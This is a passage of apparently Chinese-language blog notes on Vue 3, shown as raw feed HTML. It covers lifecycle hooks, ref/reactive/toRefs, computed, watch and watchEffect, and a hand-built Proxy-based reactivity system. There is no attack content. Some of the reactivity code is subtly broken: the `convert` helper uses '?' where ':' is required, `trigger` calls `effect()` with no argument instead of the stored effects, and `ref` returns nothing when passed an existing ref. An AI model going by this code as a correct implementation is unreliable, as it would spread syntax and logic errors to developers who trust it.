title="生命周期钩子函数"></a>生命周期钩子函数</h2><blockquote><p>setup()  开始创建组件之前，在<code>beforeCreate</code>和<code>created</code>之前执行。创建的是<code>data</code>和<code>method</code></p></blockquote><table><thead><tr><th>Options API</th><th>Hook inside setup</th><th>说明</th></tr></thead><tbody><tr><td>beforeCreate</td><td>setup</td><td>组件创建之前</td></tr><tr><td>created</td><td>setup</td><td>组件创建完成</td></tr><tr><td>beforeMount</td><td>onBeforeMount</td><td>组件挂载之前</td></tr><tr><td>mounted</td><td>onMounted</td><td>组件挂载完成</td></tr><tr><td>beforeUpdate</td><td>onBeforeUpdate</td><td>数据更新，虚拟dom打补丁之前</td></tr><tr><td>updated</td><td>onUpdated</td><td>数据更新，虚拟dom渲染完成</td></tr><tr><td>beforeDestroy</td><td>onBeforeUnmount</td><td>组件销毁之前</td></tr><tr><td>destroyed</td><td>onUnmounted</td><td>组件销毁后</td></tr></tbody></table><h2 id="reactive-toRefs-ref"><a href="#reactive-toRefs-ref" class="headerlink" title="reactive/toRefs/ref"></a>reactive/toRefs/ref</h2><ul><li>reactive：处理复杂数据类型为响应式</li><li>ref：处理基本数据类型为响应式</li><li>toRefs：<code>toRefs</code> 是 <code>toRef</code> 的批量版本。会将传入对象的每个属性处理为 <code>ref</code> 的值</li></ul><blockquote><p>ref实现的内部创建了一个对象，将value值设置成响应式的。其实他也可以接受复杂数据类型作为参数，但是其内部依然是调用 <code>reactive</code> api 进行的响应式处理，这个过程对用户来说是隐藏的。所以，为了使代码更清晰，你应该使用 <strong>ref 去处理基本类型的影响式数据</strong>，而使用 <strong>reactive 去处理复杂类型的数据</strong>（注意，这里指的不是所有的负责类型的数据）</p></blockquote><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> a <span class="token operator">=</span> <span class="token function">ref</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>value<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 0</span></code></pre><ul><li><a href="https://juejin.cn/post/6854573210781483021#heading-8" target="_blank" rel="noopener">vue3 中的响应式处理—&gt; Ref</a></li></ul><p>再看上面的例子，如果在插值表达式中想直接使用x, y而不使用 position</p><pre class=" language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Document<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>app<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    x: {{ x }} <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    y: {{ y }}  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>module<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token keyword">import</span> <span class="token punctuation">{</span> createApp<span class="token punctuation">,</span> reactive<span class="token punctuation">,</span> onMounted<span class="token punctuation">,</span> onUnmounted<span class="token punctuation">,</span> toRefs <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./vue.esm-browser.js'</span>    <span class="token keyword">function</span> useMousePosition <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">const</span> position <span class="token operator">=</span> <span class="token function">reactive</span><span class="token punctuation">(</span><span class="token punctuation">{</span>        x<span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>        y<span class="token punctuation">:</span> <span class="token number">0</span>      <span class="token punctuation">}</span><span class="token punctuation">)</span>      <span class="token keyword">const</span> update <span class="token operator">=</span> e <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        position<span class="token punctuation">.</span>x <span class="token operator">=</span> e<span class="token punctuation">.</span>pageX        position<span class="token punctuation">.</span>y <span class="token operator">=</span> e<span class="token punctuation">.</span>pageY      <span class="token punctuation">}</span>      <span class="token function">onMounted</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'mousemove'</span><span class="token punctuation">,</span> update<span class="token punctuation">)</span>      <span class="token punctuation">}</span><span class="token punctuation">)</span>      <span class="token function">onUnmounted</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        window<span class="token punctuation">.</span><span class="token function">removeEventListener</span><span class="token punctuation">(</span><span class="token string">'mousemove'</span><span class="token punctuation">,</span> update<span class="token punctuation">)</span>      <span class="token punctuation">}</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true">// 把属性也设置成响应式的</span>      <span class="token keyword">return</span> <span class="token function">toRefs</span><span class="token punctuation">(</span>position<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">createApp</span><span class="token punctuation">(</span><span class="token punctuation">{</span>      setup <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 解构时依旧为响应式</span>        <span class="token keyword">const</span> <span class="token punctuation">{</span> x<span class="token punctuation">,</span> y <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">useMousePosition</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token punctuation">{</span>          x<span class="token punctuation">,</span>          y        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    app<span class="token punctuation">.</span><span class="token function">mount</span><span class="token punctuation">(</span><span class="token string">'#app'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><h1 id="Computed-Watch-WatchEffect"><a href="#Computed-Watch-WatchEffect" class="headerlink" title="Computed/Watch/WatchEffect"></a>Computed/Watch/WatchEffect</h1><h2 id="Computed"><a href="#Computed" class="headerlink" title="Computed"></a>Computed</h2><ul><li><p>第一种用法</p><ul><li>let plusOne = computed(() =&gt; count.value + 1)</li></ul></li><li><p>第二种用法</p><ul><li><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> count <span class="token operator">=</span> <span class="token function">ref</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">const</span> plusOne <span class="token operator">=</span> <span class="token function">computed</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  <span class="token keyword">get</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> count<span class="token punctuation">.</span>value <span class="token operator">+</span> <span class="token number">1</span>  <span class="token keyword">set</span><span class="token punctuation">:</span> val <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    count<span class="token punctuation">.</span>value <span class="token operator">=</span> val <span class="token operator">-</span> <span class="token number">1</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre></li></ul></li></ul><h2 id="Watch"><a href="#Watch" class="headerlink" title="Watch"></a>Watch</h2><ul><li>Watch的三个参数<ul><li>第一个参数：要监听的数据</li><li>第二个参数：监听到数据变化后执行的函数，这个函数有两个参数分别为新值和旧值</li><li>第三个参数：选项对象，deep 和 immediate</li></ul></li><li>Watch的返回值<ul><li>取消监听的函数</li></ul></li></ul><pre class=" language-html"><code class="language-html"><span class="token comment" spellcheck="true">&lt;!-- 一个例子：自动回答 yes/no --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>module<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript">    <span class="token keyword">import</span> <span class="token punctuation">{</span> createApp<span class="token punctuation">,</span> ref<span class="token punctuation">,</span> watch <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./vue.esm-browser.js'</span>    <span class="token function">createApp</span><span class="token punctuation">(</span><span class="token punctuation">{</span>      setup <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">const</span> question <span class="token operator">=</span> <span class="token function">ref</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>        <span class="token keyword">const</span> answer <span class="token operator">=</span> <span class="token function">ref</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>        <span class="token function">watch</span><span class="token punctuation">(</span>question<span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span>newValue<span class="token punctuation">,</span> oldValue<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>          <span class="token keyword">const</span> response <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'https://www.yesno.wtf/api'</span><span class="token punctuation">)</span>          answer<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token keyword">await</span> response<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token punctuation">{</span>          question<span class="token punctuation">,</span>          answer        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">mount</span><span class="token punctuation">(</span><span class="token string">'#app'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><h2 id="WatchEffect"><a href="#WatchEffect" class="headerlink" title="WatchEffect"></a>WatchEffect</h2><blockquote><p><code>watchEffect</code>的用法与<code>watch</code>有所不同，<code>watchEffect</code>会传入一个函数，然后立即执行这个函数，对于函数里面的响应式依赖会进行监听，然后当依赖发生变化时，会重新调用传入的函数</p></blockquote><pre class=" language-js"><code class="language-js"><span class="token keyword">import</span> <span class="token punctuation">{</span> ref<span class="token punctuation">,</span> watchEffect <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'vue'</span><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span>  <span class="token function">setup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> id <span class="token operator">=</span> <span class="token function">ref</span><span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">)</span>    <span class="token function">watchEffect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">// 先输出 0 然后两秒后输出 1</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>id<span class="token punctuation">.</span>value<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      id<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">'1'</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h3><p><strong>作用：</strong> 用来追踪响应式依赖，并在追踪的时候自动触发一次，后序检测到<strong>响应式</strong>依赖的话，会再次更新，注意所有的里面的<strong>响应式数据（ref\reactive）</strong> 都会自动被加入依赖中</p><p><strong>用法：</strong> 传入一个副作用方法，并会自动追踪里面的响应式依赖，另外还可以传入一个可选的options，用于控制副作用触发的时机：pre|post|sync，分别是组件渲染前后和同步，默认是pre。此外 watchEffect返回了一个停止监听的函数。</p><ul><li><a href="https://juejin.cn/post/6904967987883671560#heading-5" target="_blank" rel="noopener">Vue3 学习笔记之 watchEffect</a></li><li><a href="https://juejin.cn/post/6872113750636232712#heading-4" target="_blank" rel="noopener">Vue3.0来袭，你想学的都在这里（二）</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vue3.0（二）</title>
      <link href="2020/12/17/Vue-Vue3.0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>2020/12/17/Vue-Vue3.0%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="Vue-js-3-0响应式原理"><a href="#Vue-js-3-0响应式原理" class="headerlink" title="Vue.js 3.0响应式原理"></a>Vue.js 3.0响应式原理</h1><ul><li>使用 Proxy 对象实现属性监听</li><li>多层属性嵌套，只有在访问属性过程中处理下一级属性</li><li>默认监听动态添加的属性</li><li>默认监听属性的删除操作</li><li>默认监听数组索引和 length 属性</li><li>可以作为单独的模块使用</li></ul><h1 id="核心方法"><a href="#核心方法" class="headerlink" title="核心方法"></a>核心方法</h1><ul><li>reactive/ref/toRefs/computed</li><li>三个底层方法，一般不会直接调用<ul><li>effect</li><li>track</li><li>trigger</li></ul></li></ul><blockquote><p>effect 函数用于定义副作用，它的参数就是副作用函数，当响应数据变化后，会导致副作用函数重新执行</p><p>track 用来收集依赖（收集effect），trigger 用来触发响应（执行effect）</p></blockquote><h2 id="reactive"><a href="#reactive" class="headerlink" title="reactive"></a>reactive</h2><ul><li>接收一个参数，判断参数是否是对象，不是对象则返回（只能处理对象）</li><li>创建拦截器对象 handler，设置 get / set /deleteProperty</li><li>返回 Proxy 对象</li></ul><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 判断是否为对象</span><span class="token keyword">const</span> isObject <span class="token operator">=</span> val <span class="token operator">=</span><span class="token operator">></span> val <span class="token operator">!==</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> val <span class="token operator">===</span> <span class="token string">'object'</span><span class="token comment" spellcheck="true">// 对象的键仍为对象继续调用 reactive 处理</span><span class="token keyword">const</span> convert <span class="token operator">=</span> target <span class="token operator">=</span><span class="token operator">></span> <span class="token function">isObject</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">reactive</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span> <span class="token operator">?</span> target<span class="token comment" spellcheck="true">// 判断对象是否有某个属性</span><span class="token keyword">const</span> hasOwnProperty <span class="token operator">=</span> Object<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>hasOwnProperty<span class="token comment" spellcheck="true">// call 方法相当于 target.hasOwnProperty(key)</span><span class="token keyword">const</span> hasOwn <span class="token operator">=</span> <span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> hasOwnProperty<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// reactive 方法</span><span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">reactive</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isObject</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> target    <span class="token keyword">const</span> handler <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token keyword">get</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">,</span> receiver<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">// 收集依赖</span>      <span class="token function">track</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">)</span>      <span class="token keyword">const</span> result <span class="token operator">=</span> Reflect<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">,</span> receiver<span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token function">convert</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token keyword">set</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> receiver<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">const</span> oldValue <span class="token operator">=</span> Reflect<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">,</span> receiver<span class="token punctuation">)</span>      <span class="token keyword">let</span> result <span class="token operator">=</span> <span class="token boolean">true</span> <span class="token comment" spellcheck="true">// 返回 boolean 值</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>oldValue <span class="token operator">!==</span> value<span class="token punctuation">)</span> <span class="token punctuation">{</span>        result <span class="token operator">=</span> Reflect<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> receiver<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">// 触发更新</span>        <span class="token function">trigger</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">)</span>      <span class="token punctuation">}</span>      <span class="token keyword">return</span> result    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token function">deleteProperty</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">const</span> hadKey <span class="token operator">=</span> <span class="token function">hasOwn</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">)</span>      <span class="token keyword">const</span> result <span class="token operator">=</span> Reflect<span class="token punctuation">.</span><span class="token function">deleteProperty</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">)</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>hadKey <span class="token operator">&amp;&amp;</span> result<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 触发更新</span>        <span class="token function">trigger</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">)</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Proxy</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> handler<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><p>测试</p><pre class=" language-js"><code class="language-js"><span class="token keyword">import</span> <span class="token punctuation">{</span> reactive <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./index.js'</span><span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token function">reactive</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  name<span class="token punctuation">:</span> <span class="token string">'zs'</span><span class="token punctuation">,</span>  age<span class="token punctuation">:</span> <span class="token number">18</span><span class="token punctuation">}</span><span class="token punctuation">)</span>obj<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'ls'</span><span class="token keyword">delete</span> obj<span class="token punctuation">.</span>ageconsole<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span></code></pre><h2 id="收集依赖"><a href="#收集依赖" class="headerlink" title="收集依赖"></a>收集依赖</h2><p>如何收集依赖，先看一个例子</p><pre class=" language-js"><code class="language-js"><span class="token keyword">import</span> <span class="token punctuation">{</span> reactive<span class="token punctuation">,</span> effect <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./reactivity/index.js'</span><span class="token keyword">const</span> product <span class="token operator">=</span> <span class="token function">reactive</span><span class="token punctuation">(</span><span class="token punctuation">{</span>  name<span class="token punctuation">:</span> <span class="token string">'iPhone'</span><span class="token punctuation">,</span>  price<span class="token punctuation">:</span> <span class="token number">5000</span><span class="token punctuation">,</span>  count<span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">let</span> total <span class="token operator">=</span> <span class="token number">0</span> <span class="token function">effect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  total <span class="token operator">=</span> product<span class="token punctuation">.</span>price <span class="token operator">*</span> product<span class="token punctuation">.</span>count  <span class="token comment" spellcheck="true">// 此处访问时会执行 price 和 count 属性的 get 方法，收集依赖</span><span class="token punctuation">}</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>total<span class="token punctuation">)</span>product<span class="token punctuation">.</span>price <span class="token operator">=</span> <span class="token number">4000</span> <span class="token comment" spellcheck="true">// 此处访问时会执行 price 和 count 属性的 set 方法，触发更新</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>total<span class="token punctuation">)</span>product<span class="token punctuation">.</span>count <span class="token operator">=</span> <span class="token number">1</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>total<span class="token punctuation">)</span></code></pre><p><img src="https://s3.ax1x.com/2021/01/13/stv1pQ.jpg" alt="stv1pQ.jpg"></p><ul><li><a href="https://juejin.cn/post/6854573210794082318" target="_blank" rel="noopener">JavaScript中的Map、WeakMap、Set和WeakSet介绍</a></li></ul><h2 id="收集依赖实现：effect-amp-amp-track"><a href="#收集依赖实现：effect-amp-amp-track" class="headerlink" title="收集依赖实现：effect &amp;&amp; track"></a>收集依赖实现：effect &amp;&amp; track</h2><pre class=" language-js"><code class="language-js"><span class="token keyword">let</span> activeEffect <span class="token operator">=</span> <span class="token keyword">null</span><span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">effect</span><span class="token punctuation">(</span>callback<span class="token punctuation">)</span> <span class="token punctuation">{</span>  activeEffect <span class="token operator">=</span> callback  <span class="token function">callback</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 访问响应式对象属性，收集依赖</span>  activeEffect <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">}</span><span class="token keyword">let</span> targetMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WeakMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">track</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>activeEffect<span class="token punctuation">)</span> <span class="token keyword">return</span>  <span class="token keyword">let</span> depsMap <span class="token operator">=</span> targetMap<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>depsMap<span class="token punctuation">)</span> <span class="token punctuation">{</span>    targetMap<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> <span class="token punctuation">(</span>depsMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Map</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token keyword">let</span> dep <span class="token operator">=</span> depsMap<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>dep<span class="token punctuation">)</span> <span class="token punctuation">{</span>    depsMap<span class="token punctuation">.</span><span class="token keyword">set</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> <span class="token punctuation">(</span>dep <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span>  dep<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>activeEffect<span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><h2 id="触发更新：trigger"><a href="#触发更新：trigger" class="headerlink" title="触发更新：trigger"></a>触发更新：trigger</h2><pre class=" language-js"><code class="language-js"><span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">trigger</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> key<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> depsMap <span class="token operator">=</span> targetMap<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>depsMap<span class="token punctuation">)</span> <span class="token keyword">return</span>  <span class="token keyword">const</span> dep <span class="token operator">=</span> depsMap<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>dep<span class="token punctuation">)</span> <span class="token punctuation">{</span>    dep<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      <span class="token function">effect</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="ref"><a href="#ref" class="headerlink" title="ref"></a>ref</h2><pre class=" language-js"><code class="language-js"><span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">ref</span><span class="token punctuation">(</span>raw<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// 判断 raw 是否是 ref 创建的对象，如果是直接返回</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isObject</span><span class="token punctuation">(</span>raw<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> raw<span class="token punctuation">.</span>__v_isRef<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span>  <span class="token punctuation">}</span>  <span class="token keyword">let</span> value <span class="token operator">=</span> <span class="token function">convert</span><span class="token punctuation">(</span>raw<span class="token punctuation">)</span>  <span class="token keyword">const</span> r <span class="token operator">=</span> <span class="token punctuation">{</span>    __v_isRef<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    <span class="token keyword">get</span> <span class="token function">value</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token function">track</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> <span class="token string">'value'</span><span class="token punctuation">)</span>      <span class="token keyword">return</span> value    <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token keyword">set</span> <span class="token function">value</span><span class="token punctuation">(</span>newValue<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>newValue <span class="token operator">!==</span> value<span class="token punctuation">)</span> <span class="token punctuation">{</span>        raw <span class="token operator">=</span> newValue        value <span class="token operator">=</span> <span class="token function">convert</span><span class="token punctuation">(</span>raw<span class="token punctuation">)</span>        <span class="token function">trigger</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> <span class="token string">'value'</span><span class="token punctuation">)</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token 